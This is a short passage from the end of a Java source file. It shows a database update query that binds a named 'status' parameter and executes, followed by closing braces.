                .setParameter("status", status)
                .executeUpdate();
    }
}
